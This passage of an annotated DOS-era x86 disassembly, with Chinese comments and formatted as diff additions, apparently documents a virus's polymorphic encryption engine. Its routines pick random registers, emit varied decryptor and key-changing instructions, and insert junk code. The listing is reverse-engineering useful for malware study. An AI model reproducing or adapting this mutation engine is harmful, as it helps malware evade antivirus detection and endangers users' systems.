+						;于 r/m 相对应
+9E80:0D23 7506           JNZ	0D2B 
+9E80:0D25 FEC4           INC	AH 
+9E80:0D27 7502           JNZ	0D2B 		;两寄存器转 0D2B
+9E80:0D29 0C40           OR	AL,40		;mm = 01, 即 r/m+disp8
+9E80:0D2B 8B0E0614       MOV	CX,[1406] 	;[1406] = 指针偏移
+9E80:0D2F BB0600         MOV	BX,0006 
+9E80:0D32 E81F04         CALL	1154 
+9E80:0D35 7402           JZ	0D39 
+9E80:0D37 E316           JCXZ	0D4F 
+9E80:0D39 0C40           OR	AL,40
+9E80:0D3B E81C04         CALL	115A 
+9E80:0D3E 750D           JNZ	0D4D 
+9E80:0D40 83F97F         CMP	CX,+7F 		;判断密匙是否为字节
+9E80:0D43 760A           JBE	0D4F 		;如果为字节转 0D4F
+9E80:0D45 83F980         CMP	CX,-80 		;如果为字转 0D4D
+9E80:0D48 7203           JB	0D4D 		;设置 mm 为 r/m+disp16
+9E80:0D4A 32ED           XOR	CH,CH 
+9E80:0D4C 3D34C0         CMP	AX,C034 
+     0D4D 34C0           XOR	AL,C0		;即 OR AL,80
+                                                ;mm = 10, 即 r/m+disp16
+9E80:0D4F 8A260C14       MOV	AH,[140C] 	;密匙寄存器 => AH
+9E80:0D53 D0E4           SHL	AH,1 
+9E80:0D55 D0E4           SHL	AH,1 
+9E80:0D57 D0E4           SHL	AH,1 		;将 r/m 字段加入 AL
+9E80:0D59 0AC4           OR	AL,AH 
+9E80:0D5B AA             STOSB	 
+9E80:0D5C A8C0           TEST	AL,C0 
+9E80:0D5E 7407           JZ	0D67 
+9E80:0D60 A880           TEST	AL,80 
+9E80:0D62 91             XCHG	AX,CX 
+9E80:0D63 AB             STOSW	 		;写指令 disp16 部分
+9E80:0D64 7501           JNZ	0D67 		;如果为 disp8, DI 减一
+9E80:0D66 4F             DEC	DI 
+9E80:0D67 873E0814       XCHG	DI,[1408] 	;[1408]为加密算法指针
+9E80:0D6B F7C50004       TEST	BP,0400 	;如果密匙寄存器为 CX
+9E80:0D6F 7403           JZ	0D74 		;则加密算法用 ROL/ROR [DI],CL
+9E80:0D71 B091           MOV	AL,91 		;91 = XCHG AX, CX
+9E80:0D73 AA             STOSB	 		;先把 AX 中密匙换到 CX 中
+9E80:0D74 92             XCHG	AX,DX 
+9E80:0D75 86C4           XCHG	AL,AH 		;DX 为加密算法指令
+9E80:0D77 893E0A14       MOV	[140A],DI 	;[140A] 为加密算法指令的
+9E80:0D7B AB             STOSW	 		;结束位置
+9E80:0D7C 7403           JZ	0D81 
+9E80:0D7E B091           MOV	AL,91 		;91 = XCHG AX, CX
+9E80:0D80 AA             STOSB	 
+9E80:0D81 873E0814       XCHG	DI,[1408] 	;恢复 DI 为变型代码指针
+9E80:0D85 58             POP	AX 
+9E80:0D86 86C4           XCHG	AL,AH 
+9E80:0D88 A3CC12         MOV	[12CC],AX 	;???? 加密算法
+9E80:0D8B 58             POP	AX 
+9E80:0D8C A20C14         MOV	[140C],AL 	;恢复密匙寄存器
+9E80:0D8F 5D             POP	BP 
+9E80:0D90 C3             RET	 
+;======================================================================
+; 指针寄存器 ===> r/m 对应表
+; 由 0D1F 查表
+9E80:0D91 FF FF FF 07 FF 06 04 05 FF 00 01 02 03
+;=====================================================================
+; 由 0B02 调用, 随机决定是否每个循环改变密匙
+; 
+9E80:0D9E E8B903         CALL	115A
+9E80:0D9F 7501           JNZ	0DA4
+9E80:0DA2 C3             RET
+9E80:0DA4 55             PUSH	BP 
+9E80:0DA5 81CD0002       OR	BP,0200 	;标志: 要保存随机指令到 [1410]
+9E80:0DA9 B80300         MOV	AX,0003 
+9E80:0DAC E8B703         CALL	1166 
+9E80:0DAF 751B           JNZ	0DCC 
+;分支之一
+9E80:0DB1 E8AF03         CALL	1163 
+9E80:0DB4 92             XCHG	AX,DX 		;DX = 随机数
+9E80:0DB5 A00C14         MOV	AL,[140C] 	;[140C] 为密匙寄存器
+9E80:0DB8 E86C01         CALL	0F27 		;ADD R_AL,DX
+						;随机改变密匙寄存器
+9E80:0DBB 873E0814       XCHG	DI,[1408] 	;[1408] 为加密代码指针
+9E80:0DBF 47             INC	DI 
+9E80:0DC0 A01014         MOV	AL,[1410] 	;[1410] 为密匙改变算法
+9E80:0DC3 AA             STOSB	 		;加入加密算法代码中
+9E80:0DC4 92             XCHG	AX,DX 
+9E80:0DC5 AB             STOSW	 
+9E80:0DC6 873E0814       XCHG	DI,[1408] 	;恢复 DI 为变型解密算法指针
+9E80:0DCA 5D             POP	BP 
+9E80:0DCB C3             RET
+;分支之二
+9E80:0DCC B004           MOV	AL,04 
+9E80:0DCE E89503         CALL	1166 
+9E80:0DD1 752A           JNZ	0DFD 
+9E80:0DD3 B8C0D1         MOV	AX,D1C0 	;D1C0 = ROL R_AL,1
+9E80:0DD6 BB0200         MOV	BX,0002 
+9E80:0DD9 E87803         CALL	1154 
+9E80:0DDC 7510           JNZ	0DEE 
+9E80:0DDE 803E0D1401     CMP	Byte Ptr [140D],01 
+9E80:0DE3 7509           JNZ	0DEE 		;密文长度寄存器不为 CX
+9E80:0DE5 F7C50004       TEST	BP,0400 	;且密匙寄存器为 CX 转 0DEE
+9E80:0DE9 7503           JNZ	0DEE 		;否则使用 ROL R_AL,CL
+9E80:0DEB 80CC02         OR	AH,02 		;现 AX = D3C0
+9E80:0DEE 86C4           XCHG	AL,AH 		;即 ROL R_AL,CL
+9E80:0DF0 50             PUSH	AX 
+9E80:0DF1 0A260C14       OR	AH,[140C] 	;存指令
+9E80:0DF5 AB             STOSW	 
+9E80:0DF6 58             POP	AX 
+9E80:0DF7 873E0814       XCHG	DI,[1408] 	;[1408] 为加密算法指令指针
+9E80:0DFB EBC8           JMP	0DC5 		;保存加密算法指令
+;分支之三
+9E80:0DFD 48             DEC	AX 
+9E80:0DFE 7505           JNZ	0E05 
+9E80:0E00 B8C8D1         MOV	AX,D1C8 	;D1C8 = ROR R_AL,1
+9E80:0E03 EBD1           JMP	0DD6 		;其它见 0DD6 处
+;分支之四
+9E80:0E05 48             DEC	AX 
+9E80:0E06 7505           JNZ	0E0D 
+9E80:0E08 B8D0F7         MOV	AX,F7D0 	;F7D0 = NOT R_AL
+9E80:0E0B EBE1           JMP	0DEE 
+;分支之五
+9E80:0E0D 48             DEC	AX 
+9E80:0E0E 7505           JNZ	0E15 
+9E80:0E10 B8D8F7         MOV	AX,F7D8 	;F7D8 = NEG R_AL
+9E80:0E13 EBD9           JMP	0DEE 
+;分支之六
+9E80:0E15 E84B03         CALL	1163 
+9E80:0E18 92             XCHG	AX,DX 
+9E80:0E19 A00C14         MOV	AL,[140C] 	;[140C] = 密匙寄存器
+9E80:0E1C E86E01         CALL	0F8D 		;产生 ADD R_AL,数_DX 指令
+9E80:0E1F EB9A           JMP	0DBB 
+;==========================================================================
+; 本子程序由 0ADB 调用, 取随机寄存器于 [140C] 中 (密匙寄存器)
+; 并产生 MOV R_140C, 密匙 指令
+9E80:0E21 E8DC02         CALL	1100 		;取一寄存器
+9E80:0E24 92             XCHG	AX,DX 		;
+9E80:0E25 E83B03         CALL	1163 
+9E80:0E28 A3A311         MOV	[11A3],AX 	;随机数 (密匙)
+9E80:0E2B 92             XCHG	AX,DX 
+9E80:0E2C A20C14         MOV	[140C],AL 
+9E80:0E2F E86F00         CALL	0EA1 
+9E80:0E32 C3             RET
+;==========================================================================
+; 本子程序由 0AD8 调用, 取随机寄存器于 140D 中 (计数寄存器)
+; 并产生 MOV R_140D, 密文长度 指令
+9E80:0E33 E8CA02         CALL	1100 		;取寄存器
+9E80:0E36 A20D14         MOV	[140D],AL 
+9E80:0E39 BAED08         MOV	DX,08ED 	;产生 MOV R_AL,08ED
+9E80:0E3C E86200         CALL	0EA1 		;08ED x 2 = 11DA 为解密数据长度
+9E80:0E3F C3             RET
+;==========================================================================
+; 本子程序由 0ADE 调用, 产生指针寄存器
+; 取第一偏移寄存器于 140E 中 (BX,BP,SI,DI 之一)
+; 再取第二偏移寄存器于 140F 中, 并产生 MOV R_140E,xxxx 和 MOV R_140F,yyyy指令
+; 其中 xxxx+yyyy+[1406] = 入口IP地址
+; 指针寻址方式可能为 [BX/BP/SI/DI+xxxx] 或 [BX/BP+SI/DI+xxxx] 两种方式
+9E80:0E40 8B160414       MOV	DX,[1404] 	;1404 = 解密后 IP 入口
+9E80:0E44 E8AD02         CALL	10F4 
+9E80:0E47 A20E14         MOV	[140E],AL 
+9E80:0E4A C6060F14FF     MOV	Byte Ptr [140F],FF 	;第二偏移寄存器无
+9E80:0E4F BB0300         MOV	BX,0003 
+9E80:0E52 E8FF02         CALL	1154 
+9E80:0E55 7533           JNZ	0E8A 		;随机分支 0E57 或 0E8A
+9E80:0E57 3C06           CMP	AL,06 
+9E80:0E59 BBC000         MOV	BX,00C0 	;BX 中数用来测试 BP 中
+9E80:0E5C 7202           JB	0E60 		;表示的寄存器是否存在
+9E80:0E5E B328           MOV	BL,28		;00C0 => SI/DI, 0028 => BP/BX
+						;以上几句为
+						;当 R_AL 为 BP/BX 时测试 SI/DI
+						;当 R_AL 为 SI/DI 时测试 BP/BX
+9E80:0E60 85EB           TEST	BX,BP 		;测试寄存器是否存在
+9E80:0E62 7426           JZ	0E8A 		;不存在转 0E8A
+9E80:0E64 E88D02         CALL	10F4 		;取寄存器
+9E80:0E67 50             PUSH	AX 
+9E80:0E68 E8BC02         CALL	1127 		;转换到 BIT
+9E80:0E6B 84C3           TEST	BL,AL 		;测试是否为 BX 中的寄存器
+9E80:0E6D 58             POP	AX 
+9E80:0E6E 7505           JNZ	0E75 		;是, 转 0E75
+9E80:0E70 E8AB02         CALL	111E 		;恢复 BP 中寄存器, 重新选择
+9E80:0E73 EBEF           JMP	0E64 
+9E80:0E75 A20F14         MOV	[140F],AL 	;保存寄存器到 [140F]
+9E80:0E78 BBFFFF         MOV	BX,FFFF 	;产生随机数
+9E80:0E7B E8D602         CALL	1154 
+9E80:0E7E 2BD3           SUB	DX,BX 
+9E80:0E80 87DA           XCHG	BX,DX 
+9E80:0E82 E81C00         CALL	0EA1 		;产生 MOV R_140F,随机数1
+9E80:0E85 87DA           XCHG	BX,DX 
+9E80:0E87 A00E14         MOV	AL,[140E] 
+9E80:0E8A 33DB           XOR	BX,BX 
+9E80:0E8C E8CB02         CALL	115A 
+9E80:0E8F 7508           JNZ	0E99 
+9E80:0E91 BBFFFF         MOV	BX,FFFF 
+9E80:0E94 E8BD02         CALL	1154 
+9E80:0E97 2BD3           SUB	DX,BX 
+9E80:0E99 891E0614       MOV	[1406],BX 	;1406 为指针偏移
+9E80:0E9D E80100         CALL	0EA1 		;产生 MOV R_140E,随机数2
+9E80:0EA0 C3             RET	 		;RND1 + RND2 + [1406] = 入口DX
+;===========================================================================
+; 随机产生 MOV R_AL,数_DX 功能的代码
+; 入口: AX = 寄存器, DX = 16位数据
+;===========================================================================
+9E80:0EA1 53             PUSH	BX 
+9E80:0EA2 52             PUSH	DX 
+9E80:0EA3 BB0400         MOV	BX,0004 
+9E80:0EA6 E8AB02         CALL	1154 		;随机分支
+9E80:0EA9 7513           JNZ	0EBE 		;3/4 可能转 0EBE
+9E80:0EAB BBFFFF         MOV	BX,FFFF 
+9E80:0EAE E8A302         CALL	1154 
+9E80:0EB1 2BD3           SUB	DX,BX 
+9E80:0EB3 E80A00         CALL	0EC0 		;产生 MOV R_AL,数_DX1 指令
+9E80:0EB6 8BD3           MOV	DX,BX 
+9E80:0EB8 E8D200         CALL	0F8D 		;产生 ADD R_AL,数_DX2 指令
+9E80:0EBB 5A             POP	DX 		;组合起来计 MOV R_AL,数_DX
+9E80:0EBC 5B             POP	BX 		;其中 数_DX = 数_DX1 + 数_DX2
+9E80:0EBD C3             RET	 
+9E80:0EBE 5A             POP	DX 
+9E80:0EBF 5B             POP	BX 
+;==========================================================================
+; 随机产生 MOV R_AL,数_DX 代码
+;==========================================================================
+9E80:0EC0 50             PUSH	AX 
+9E80:0EC1 53             PUSH	BX 
+9E80:0EC2 51             PUSH	CX 
+9E80:0EC3 52             PUSH	DX 
+9E80:0EC4 98             CBW	 
+9E80:0EC5 BB0200         MOV	BX,0002 
+9E80:0EC8 E88902         CALL	1154 
+9E80:0ECB 7425           JZ	0EF2 
+9E80:0ECD B302           MOV	BL,02 
+9E80:0ECF E88202         CALL	1154 
+9E80:0ED2 7519           JNZ	0EED 
+;==========================================================================
+; 分支之一: 产生指令 MOV r/m16,i16 或 LEA r/m16,[d16]
+; 有两种可能性: C7 或 8D
+9E80:0ED4 0DC0C7         OR	AX,C7C0 	;C7 mm 000 r/m 为 MOV r/m16,i16
+9E80:0ED7 E88002         CALL	115A 
+9E80:0EDA 7507           JNZ	0EE3 
+9E80:0EDC B103           MOV	CL,03 
+9E80:0EDE D2E0           SHL	AL,CL 
+9E80:0EE0 35064A         XOR	AX,4A06 	;C700 xor 4A06 = 8D06
+9E80:0EE3 86C4           XCHG	AL,AH 		;8D 00 rrr 110 为 LEA rrr,[d16]
+9E80:0EE5 AB             STOSW	 
+9E80:0EE6 92             XCHG	AX,DX 
+9E80:0EE7 AB             STOSW	 
+9E80:0EE8 E83E01         CALL	1029 
+9E80:0EEB EB79           JMP	0F66 
+;==========================================================================
+; 分支之二: 产生指令 MOV rrr,i16 (B8 + rrr)
+9E80:0EED 0CB8           OR	AL,B8 		;B8 + r 为 MOV rrr,i16
+9E80:0EEF AA             STOSB	 
+9E80:0EF0 EBF4           JMP	0EE6 
+;===========================================================================
+; 分支之三: 产生指令 SUB r/m16,r/m16 或 CLC/SBB r/m16,r/m16 指令先清零
+; 再产生: ADD/XOR/ADC/OR r/m16,i16 指令
+9E80:0EF2 50             PUSH	AX 
+9E80:0EF3 B103           MOV	CL,03 
+9E80:0EF5 8AE8           MOV	CH,AL 
+9E80:0EF7 D2E5           SHL	CH,CL 
+9E80:0EF9 0AC5           OR	AL,CH 		;使 r/m1 = r/m2 = R_AL
+9E80:0EFB E85C02         CALL	115A 
+9E80:0EFE 7503           JNZ	0F03 
+9E80:0F00 80CC02         OR	AH,02 
+9E80:0F03 E85402         CALL	115A 
+9E80:0F06 751A           JNZ	0F22 
+9E80:0F08 0DC029         OR	AX,29C0 	;29 mm rrr r/m 为 SUB r/m16,r16
+9E80:0F0B E84C02         CALL	115A 
+9E80:0F0E 7506           JNZ	0F16 
+9E80:0F10 80F430         XOR	AH,30		;29 xor 30 = 19
+9E80:0F13 E8F600         CALL	100C 		;19 mm rrr r/m 为 SBB r/m16,r16
+9E80:0F16 86C4           XCHG	AL,AH 
+9E80:0F18 AB             STOSW	 
+9E80:0F19 E80D01         CALL	1029 
+9E80:0F1C 58             POP	AX 
+9E80:0F1D E80700         CALL	0F27 		;产生 ADD/ADC/XOR/OR 指令
+9E80:0F20 EBC9           JMP	0EEB 
+;===========================================================================
+; 分支之四: 产生指令 SUB r/m16,r/m16 或 CLC/SBB r/m16,r/m16 指令先清零
+; 再产生: ADD/XOR/ADC/OR r/m16,i16 指令
+9E80:0F22 0DC031         OR	AX,31C0 	;初始 AH = 0002
+9E80:0F25 EBEF           JMP	0F16 		;33 mm rrr r/m = XOR r/m16,r16
+;===========================================================================
+; 随机产生 ADD R_AL,数_DX 功能的指令
+; 入口 AL = 寄存器, DX = 16位数据 (原寄存器必须为 0)
+9E80:0F27 50             PUSH	AX 
+9E80:0F28 53             PUSH	BX 
+9E80:0F29 51             PUSH	CX 
+9E80:0F2A 52             PUSH	DX 
+9E80:0F2B 98             CBW	 
+9E80:0F2C BB0200         MOV	BX,0002 
+9E80:0F2F E82202         CALL	1154 
+9E80:0F32 B93035         MOV	CX,3530 	;CL 中的数据将与以后分支
+9E80:0F35 7414           JZ	0F4B 		;中 AL 中的数据异或
+9E80:0F37 B9080D         MOV	CX,0D08 	;指令有 4 种可能性:
+9E80:0F3A 4B             DEC	BX 		;35 为 XOR AX,i16
+9E80:0F3B 740E           JZ	0F4B 		;05 为 OR  AX,i16
+9E80:0F3D B90005         MOV	CX,0500 	;15 为 ADD AX,i16
+9E80:0F40 E81702         CALL	115A 		;02 为 ADC AX,i16
+9E80:0F43 7506           JNZ	0F4B 
+9E80:0F45 B91015         MOV	CX,1510 
+9E80:0F48 E8C100         CALL	100C 
+9E80:0F4B F7C50002       TEST	BP,0200 	;需要保存代码到 [1410]
+9E80:0F4F 7404           JZ	0F55 
+9E80:0F51 882E1014       MOV	[1410],CH 
+9E80:0F55 E80202         CALL	115A 
+9E80:0F58 7511           JNZ	0F6B 
+9E80:0F5A 0AC0           OR	AL,AL 		;如果 R_AL 是 AX
+9E80:0F5C 750D           JNZ	0F6B 		;使用以上 4 种指令
+9E80:0F5E 8AC5           MOV	AL,CH 
+9E80:0F60 AA             STOSB	 
+9E80:0F61 92             XCHG	AX,DX 
+9E80:0F62 AB             STOSW	 
+9E80:0F63 E8C300         CALL	1029 
+9E80:0F66 5A             POP	DX 
+9E80:0F67 59             POP	CX 
+9E80:0F68 5B             POP	BX 
+9E80:0F69 58             POP	AX 
+9E80:0F6A C3             RET	 
+9E80:0F6B 0DC081         OR	AX,81C0 	;C0 or 30/08/00/10
+9E80:0F6E 0AC1           OR	AL,CL 		;    =  F0/C8/C0/D0
+9E80:0F70 E8E701         CALL	115A 		;81 F0 为 XOR r/m16,i16
+9E80:0F73 750D           JNZ	0F82 		;81 C8 为 OR  r/m16,i16
+9E80:0F75 83FA7F         CMP	DX,+7F 		;81 C0 为 ADD r/m16,i16
+9E80:0F78 7605           JBE	0F7F 		;81 D0 为 ADC r/m16,i16
+9E80:0F7A 83FA80         CMP	DX,-80 
+9E80:0F7D 7203           JB	0F82 		;如果立即数在 7F 到 -80 之间
+9E80:0F7F 80CC02         OR	AH,02 		;用 83 F0/C8/C0/D0 指令
+9E80:0F82 86C4           XCHG	AL,AH 		;为 XOR/OR/ADD/ADC r/m16,i8
+9E80:0F84 AB             STOSW	 
+9E80:0F85 A802           TEST	AL,02 		;81 xor 02 = 83
+9E80:0F87 92             XCHG	AX,DX 
+9E80:0F88 74D8           JZ	0F62 
+9E80:0F8A AA             STOSB	 
+9E80:0F8B EBD6           JMP	0F63 
+;==========================================================================
+; 随机产生 ADD R_AL,数_DX 指令 (原寄存器不一定为 0)
+9E80:0F8D 50             PUSH	AX 
+9E80:0F8E 53             PUSH	BX 
+9E80:0F8F 51             PUSH	CX 
+9E80:0F90 52             PUSH	DX 
+9E80:0F91 98             CBW	 
+9E80:0F92 8BCA           MOV	CX,DX 
+9E80:0F94 BB0300         MOV	BX,0003 
+9E80:0F97 E8BA01         CALL	1154 
+9E80:0F9A 744F           JZ	0FEB 
+   分支之一:
+9E80:0F9C BBC040         MOV	BX,40C0 
+9E80:0F9F F7C50002       TEST	BP,0200 	;需要保存代码到 [1410]
+9E80:0FA3 7405           JZ	0FAA 
+9E80:0FA5 C606101405     MOV	Byte Ptr [1410],05 
+9E80:0FAA 83F903         CMP	CX,+03 		;数据在 0 到 3 之间
+9E80:0FAD 7218           JB	0FC7 		;转 0FC7
+9E80:0FAF F7D9           NEG	CX 
+9E80:0FB1 83F903         CMP	CX,+03 		;数据在 0 到 -3 之间
+9E80:0FB4 7735           JA	0FEB 		;数据在 3 到 -3 之间采用
+9E80:0FB6 BBC848         MOV	BX,48C8 	;多条 INC/DEC 指令
+9E80:0FB9 F7C50002       TEST	BP,0200 	;来完成
+9E80:0FBD 7405           JZ	0FC4 		;负数用 DEC, 正数用 INC
+9E80:0FBF C60610142D     MOV	Byte Ptr [1410],2D
+9E80:0FC4 42             INC	DX 
+9E80:0FC5 41             INC	CX 
+9E80:0FC6 3D4A49         CMP	AX,494A 
+     0FC7 4A             DEC	DX
+     0FC8 49             DEC	CX
+9E80:0FC9 50             PUSH	AX 
+9E80:0FCA B80500         MOV	AX,0005 
+9E80:0FCD E89601         CALL	1166 
+9E80:0FD0 58             POP	AX 
+9E80:0FD1 50             PUSH	AX 
+9E80:0FD2 7509           JNZ	0FDD 
+9E80:0FD4 B4FF           MOV	AH,FF 		;FF mm 001 r/m = DEC r/m16
+9E80:0FD6 86DF           XCHG	BL,BH 		;FF mm 000 r/m = INC r/m16
+9E80:0FD8 86C4           XCHG	AL,AH 
+9E80:0FDA AA             STOSB	 
+9E80:0FDB 86C4           XCHG	AL,AH 
+9E80:0FDD 0AC7           OR	AL,BH 		;48 + r = DEC rrr
+9E80:0FDF AA             STOSB	 		;40 + r = INC rrr
+9E80:0FE0 58             POP	AX 
+9E80:0FE1 E84500         CALL	1029 
+9E80:0FE4 0BD2           OR	DX,DX 		;DX 内数据还未为零
+9E80:0FE6 75AC           JNZ	0F94 		;转 0F94 继续循环
+9E80:0FE8 E97BFF         JMP	0F66 
+; DX 数据不在 3 到 -3 之间
+9E80:0FEB E86C01         CALL	115A 
+9E80:0FEE 7403           JZ	0FF3 
+9E80:0FF0 E94AFF         JMP	0F3D 		;转产生 ADD/ADC R_AL,数_DX
+9E80:0FF3 F7C50002       TEST	BP,0200 
+9E80:0FF7 7502           JNZ	0FFB 
+9E80:0FF9 F7DA           NEG	DX 		;数_DX 取反
+;=========================================================================
+; 分支之二
+9E80:0FFB B9282D         MOV	CX,2D28 	;81 mm 101 r/m = SUB r/m16,i16
+9E80:0FFE E85901         CALL	115A 		;即 81 28 
+9E80:1001 7403           JZ	1006 		;2D + r = SUB AX,i16
+9E80:1003 E945FF         JMP	0F4B 		;81 mm 011 r/m = SBB r/m16,i16
+9E80:1006 B9181D         MOV	CX,1D18 	;即 81 18
+9E80:1009 E93CFF         JMP	0F48 		;1D + r = SBB AX,i16
+;==========================================================================
+; 产生清 CY 标志指令
+; 有两种可能性: CLC 或 STC/CMC
+9E80:100C 50             PUSH	AX 
+9E80:100D 55             PUSH	BP 		;BP = 0800 表示
+9E80:100E 81CD0008       OR	BP,0800 	;随机指令中不能改变 CY 标志
+9E80:1012 B0F8           MOV	AL,F8 		;F8 为 CLC
+9E80:1014 E84301         CALL	115A 
+9E80:1017 7509           JNZ	1022 
+9E80:1019 B8F9F5         MOV	AX,F5F9 	;F9/F5 为 STC/CMC
+9E80:101C AA             STOSB	 
+9E80:101D E80900         CALL	1029 
+9E80:1020 86C4           XCHG	AL,AH 
+9E80:1022 AA             STOSB	 
+9E80:1023 E80300         CALL	1029 
+9E80:1026 5D             POP	BP 
+9E80:1027 58             POP	AX 
+9E80:1028 C3             RET	 
+;=========================================================================
+; 随机产生无效指令 0 - 2 句
+; 入口:  无              出口:  无
+9E80:1029 50             PUSH	AX 
+9E80:102A B80200         MOV	AX,0002 
+9E80:102D E83601         CALL	1166 
+9E80:1030 91             XCHG	AX,CX 		;产生小于 3 的随机数于 CX
+9E80:1031 E305           JCXZ	1038 
+9E80:1033 E80500         CALL	103B 		;随机产生无效指令
+9E80:1036 E2FB           LOOP	1033 
+9E80:1038 91             XCHG	AX,CX 
+9E80:1039 58             POP	AX 
+9E80:103A C3             RET	 
+;=========================================================================
+; 随机产生一句无效指令
+; 入口:  无              出口:  无
+9E80:103B 50             PUSH	AX 
+9E80:103C 53             PUSH	BX 
+9E80:103D 51             PUSH	CX 
+9E80:103E 52             PUSH	DX 
+9E80:103F 55             PUSH	BP 
+9E80:1040 F7C50001       TEST	BP,0100 	;如果 BP=0100, 则不执行
+9E80:1044 7543           JNZ	1089 
+9E80:1046 81E5FFFD       AND	BP,FDFF 	;清 BP 0200
+9E80:104A 81CD0001       OR	BP,0100 	;设置不执行本子程序标志
+9E80:104E E80901         CALL	115A 
+9E80:1051 7536           JNZ	1089 		;随机分支
+9E80:1053 B103           MOV	CL,03 
+9E80:1055 E80B01         CALL	1163 
+9E80:1058 92             XCHG	AX,DX 		;DX = 随机数
+9E80:1059 E8A400         CALL	1100 		;随机取一个寄存器于 AX 
+9E80:105C 722B           JB	1089 
+9E80:105E BB0600         MOV	BX,0006 
+9E80:1061 F7C50008       TEST	BP,0800 	;随机指令中是否可以改变 C
+9E80:1065 7402           JZ	1069 		;标志位, 如果可以, 产生 7 种
+9E80:1067 B302           MOV	BL,02 		;如果不可以, 产生 3 种随机代码
+9E80:1069 E8E800         CALL	1154 
+9E80:106C 751F           JNZ	108D 		;随机分支, 入口 AX = 寄存器
+;===============================================
+; 106C 处随机分支一, 产生 MOV R_AL,R_DL 指令
+; 有两种可能 89 或 8C (两种 MOV 指令)
+9E80:106E 80CC89         OR	AH,89 		;89 mm rrr r/m 为指令
+9E80:1071 E8E600         CALL	115A 		;MOV r/m16, r16
+9E80:1074 7405           JZ	107B 
+9E80:1076 80CC02         OR	AH,02 		;8C mm rrr r/m 为指令
+9E80:1079 86C2           XCHG	AL,DL 		;MOV r16, r/m16
+9E80:107B 80E207         AND	DL,07 
+9E80:107E 2407           AND	AL,07 
+9E80:1080 D2E2           SHL	DL,CL 
+9E80:1082 0CC0           OR	AL,C0 		;即 mm 为 11: 表示 r/m 为 rrr
+9E80:1084 0AC2           OR	AL,DL 
+9E80:1086 86C4           XCHG	AL,AH 
+9E80:1088 AB             STOSW	 		;随机产生 MOV R_AL,R_DL
+9E80:1089 5D             POP	BP 		;(两种可能: 89 或 8C)
+9E80:108A E9D9FE         JMP	0F66 
+9E80:108D 4B             DEC	BX 
+9E80:108E 7520           JNZ	10B0 
+;============================================================================
+; 106C 处随机分支二, 产生 XCHG R_AL,R_DL 指令
+; 当寄存器之一为 AX 时使用 90, 否则使用 87
+9E80:1090 92             XCHG	AX,DX 
+9E80:1091 E86C00         CALL	1100 
+9E80:1094 72F3           JB	1089 		;随机取一个寄存器于 AX
+9E80:1096 92             XCHG	AX,DX 		;DX = 随机寄存器
+9E80:1097 E8C000         CALL	115A 		;随机决定是否使用 AX 专用指令
+9E80:109A 7508           JNZ	10A4
+9E80:109C 0AD2           OR	DL,DL 		;寄存器之一为 AX 转 10A9
+9E80:109E 7409           JZ	10A9 		;使用 AX 专用指令 90
+9E80:10A0 0AC0           OR	AL,AL 
+9E80:10A2 7405           JZ	10A9 
+9E80:10A4 80CC87         OR	AH,87 		;87 mm rrr r/m 为指令
+9E80:10A7 EBD2           JMP	107B 		;XCHG r/m16, r16
+9E80:10A9 0C90           OR	AL,90 		;90 + r 为指令
+9E80:10AB 0AC2           OR	AL,DL 		;XCHG AX, r16
+9E80:10AD AA             STOSB	 
+9E80:10AE EBD9           JMP	1089 
+9E80:10B0 4B             DEC	BX 
+9E80:10B1 750B           JNZ	10BE 
+;=============================================================================
+; 106C 处随机分支三, 随机产生前缀 CS: SS: STD CLD 或 STI
+9E80:10B3 B004           MOV	AL,04 
+9E80:10B5 E8AE00         CALL	1166 
+9E80:10B8 BBDF10         MOV	BX,10DF 	;查表随机产生 CS:, SS:, STD
+9E80:10BB D7             XLAT	 		;CLD 或 STI
+9E80:10BC EBEF           JMP	10AD 
+;============================================================================
+; 106C 处随机分支之四, 产生 MOV R_AL,数_DX 指令
+; 可能用 XOR/OR/ADD/ADC 等指令
+; 有 12 种可能 35, 0D, 05, 15, 81(83) F0, 81(83) C8, 81(83) C0, 81(83) D0
+9E80:10BE 4B             DEC	BX 
+9E80:10BF 7505           JNZ	10C6 
+9E80:10C1 E863FE         CALL	0F27 		;调用 0F27
+9E80:10C4 EBC3           JMP	1089 
+;==========================================================================
+; 106C 处随机分支之五, 产生 ADD R_AL,数_DX 指令
+; 可能用 DEC/INC/ADD/ADC/SBB/SUB 等指令
+9E80:10C6 4B             DEC	BX 
+9E80:10C7 7505           JNZ	10CE 
+9E80:10C9 E8C1FE         CALL	0F8D 		;调用 0F8D
+9E80:10CC EBBB           JMP	1089 
+;===========================================================================
+; 106C 处随机分支之六, 产生 MOV R_AL,数_DX 指令
+; 具体见 0EA1 (0F8D 和 0F27 的组合)
+9E80:10CE 4B             DEC	BX 
+9E80:10CF 7505           JNZ	10D6 
+9E80:10D1 E8CDFD         CALL	0EA1 		;调用 0EA1
+9E80:10D4 EBB3           JMP	1089 		;产生 MOV R_AL,数DX 指令
+;===========================================================================
+; 106C 处随机分支之七, 产生 ADD R_AL,R_DL 指令
+; 有两种可能, 01 或 03
+9E80:10D6 80E638         AND	DH,38
+9E80:10D9 B401           MOV	AH,01 		;01 mm rrr r/m 为 ADD r/m16,r16
+9E80:10DB 0AE6           OR	AH,DH 		;03 mm rrr r/m 为 ADD r16,r/m16
+9E80:10DD EB92           JMP	1071 
+; 由 10BB 处查表
+9E80:10DF 2E 36 FC FD FB   ( CS: SS: STD CLD STI )
+9E80:10E4 803E0E1405     CMP	Byte Ptr [140E],05 
+9E80:10E9 7405           JZ	10F0 
+9E80:10EB 803E0F1405     CMP	Byte Ptr [140F],05 
+9E80:10F0 C3             RET
+;=======================================================================
+; 随机取寄存器, 但必须为 BX, BP, SI, DI 之一 ,入口为 10F4
+; (取 BP 中一位, 但必须是第 3, 5, 6, 7 位)	 
+9E80:10F1 E82A00         CALL	111E 		;恢复寄存器位 (在 BP 中)
+9E80:10F4 E80900         CALL	1100 		;入口, 取随机一个寄存器
+9E80:10F7 3C03           CMP	AL,03 		;为 BX 返回
+9E80:10F9 7404           JZ	10FF 
+9E80:10FB 3C05           CMP	AL,05 		;小于 5 重新取
+9E80:10FD 72F2           JB	10F1 
+9E80:10FF C3             RET
+;=========================================================================
+; 随机取寄存器, 返回 AX = 寄存器号
+; (取 BP 中一位, BP 已是全零返回 CY, 否则返回 NC )
+9E80:1100 F7C5EF00       TEST	BP,00EF 	;已无空余寄存器
+9E80:1104 F9             STC	 		;设置 CY 返回
+9E80:1105 7416           JZ	111D 
+9E80:1107 B80700         MOV	AX,0007 	;取小于等于 7 的数
+9E80:110A E85900         CALL	1166 
+9E80:110D 50             PUSH	AX 
+9E80:110E 98             CBW	 
+9E80:110F E81500         CALL	1127 		;设置数字到 BIT
+9E80:1112 85E8           TEST	AX,BP 
